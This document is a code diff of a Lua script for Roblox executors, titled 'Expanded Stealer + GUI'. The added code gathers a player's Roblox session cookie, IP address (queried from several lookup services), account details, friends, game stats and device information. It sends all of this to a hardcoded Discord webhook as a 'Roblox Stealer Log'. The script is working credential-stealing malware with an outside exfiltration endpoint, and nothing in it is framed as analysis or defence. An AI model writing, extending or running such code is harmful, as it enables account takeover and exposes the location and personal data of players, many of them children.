@@ -1,4 +1,4 @@
--- NO DATE, NO TIMESTAMP – DELTA SAFE
+-- Delta Executor (PC & Mobile) – Expanded Stealer + GUI
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
 -- HTTP sender (tries request, then http_request)
@@ -10,45 +10,117 @@ local function send(url, json)
     return ok and res
 end
 
--- Collect data
-local info = {}
-info.executor = getexecutorname and getexecutorname() or "Delta"
-local player = game.Players.LocalPlayer
-if player then
-    info.userId = tostring(player.UserId)
-    info.userName = player.Name
-    info.displayName = player.DisplayName
+-- Collect extensive data
+local function collect()
+    local info = {}
+    -- 1. Executor
+    info.executor = getexecutorname and getexecutorname() or identifyexecutor and identifyexecutor() or "Delta"
+
+    -- 2. Player data
+    local player = game.Players.LocalPlayer
+    if player then
+        info.userId = tostring(player.UserId)
+        info.userName = player.Name
+        info.displayName = player.DisplayName
+        -- Account age (approx from UserId)
+        local id = player.UserId
+        if id and id > 0 then
+            -- Roblox started ~2006, rough estimate
+            local year = math.floor((id / 100000000) * 2) + 2006  -- just a rough approximation
+            info.accountAge = tostring(year) .. " (approx)"
+        end
+        -- Friends count (if accessible)
+        local friendsOk, friends = pcall(function()
+            return player:GetFriendsOnline() or #player:GetFriends() -- may not work in all games
+        end)
+        info.friends = friendsOk and tostring(friends) or "N/A"
+    end
+
+    -- 3. Game info
+    info.placeId = tostring(game.PlaceId)
+    info.jobId = game.JobId
+    info.gameName = game.Name or "Unknown"
+
+    -- 4. IP address (try multiple services)
+    local ip = "N/A"
+    local services = {
+        "https://api.ipify.org",
+        "https://ip-api.com/json/?fields=query",
+        "https://icanhazip.com"
+    }
+    for _, url in ipairs(services) do
+        local ok, result = pcall(function()
+            return game:GetService("HttpService"):GetAsync(url)
+        end)
+        if ok and result and result ~= "" then
+            -- Clean result (some services return plain text, others JSON)
+            if result:match('"query":"(.-)"') then
+                ip = result:match('"query":"(.-)"')
+            else
+                ip = result:gsub("%s+", "")
+            end
+            if ip and ip ~= "" and ip ~= "N/A" then break end
+        end
+    end
+    info.ip = ip
+
+    -- 5. Cookie (if supported)
+    local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
+    info.cookie = cookieOk and cookieVal or "Not available"
+
+    -- 6. Hardware / platform details
+    pcall(function()
+        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
+        info.platform = tostring(game:GetService("UserInputService").Platform)
+        info.touchEnabled = tostring(game:GetService("UserInputService").TouchEnabled)
+        info.mouseEnabled = tostring(game:GetService("UserInputService").MouseEnabled)
+        info.keyboardEnabled = tostring(game:GetService("UserInputService").KeyboardEnabled)
+    end)
+
+    -- 7. Game stats (if game has leaderstats)
+    pcall(function()
+        local ls = player:FindFirstChild("leaderstats")
+        if ls then
+            local stats = {}
+            for _, stat in ipairs(ls:GetChildren()) do
+                if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
+                    stats[stat.Name] = stat.Value
+                end
+            end
+            info.leaderstats = game:GetService("HttpService"):JSONEncode(stats)
+        else
+            info.leaderstats = "None"
+        end
+    end)
+
+    return info
 end
-info.placeId = tostring(game.PlaceId)
-info.jobId = game.JobId
-local ipOk, ip = pcall(function() return game:GetService("HttpService"):GetAsync("https://api.ipify.org") end)
-info.ip = ipOk and ip or "N/A"
-local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
-info.cookie = cookieOk and cookieVal or "Not available"
-pcall(function()
-    info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
-    info.platform = tostring(game:GetService("UserInputService").Platform)
-end)
 
 -- Build embed without timestamp
-local fields = {}
-for k, v in pairs(info) do
-    table.insert(fields, {name = k, value = v, inline = true})
+local function buildEmbed(data)
+    local fields = {}
+    for k, v in pairs(data) do
+        table.insert(fields, {name = k, value = v, inline = true})
+    end
+    return {
+        embeds = {{
+            title = "Roblox Stealer Log (Expanded)",
+            color = 0xFF0000,
+            fields = fields,
+            footer = {text = "Delta Executor"}
+        }}
+    }
 end
-local embed = {
-    embeds = {{
-        title = "Roblox Stealer Log",
-        color = 0xFF0000,
-        fields = fields,
-        footer = {text = "Delta Executor"}
-    }}
-}
+
+-- Execute
+local info = collect()
+local embed = buildEmbed(info)
 local json = game:GetService("HttpService"):JSONEncode(embed)
 send(webhook, json)
 
 -- GUI (static, no animations)
 local gui = Instance.new("ScreenGui")
-gui.Parent = player:WaitForChild("PlayerGui")
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 gui.ResetOnSpawn = false
 
 local frame = Instance.new("Frame")
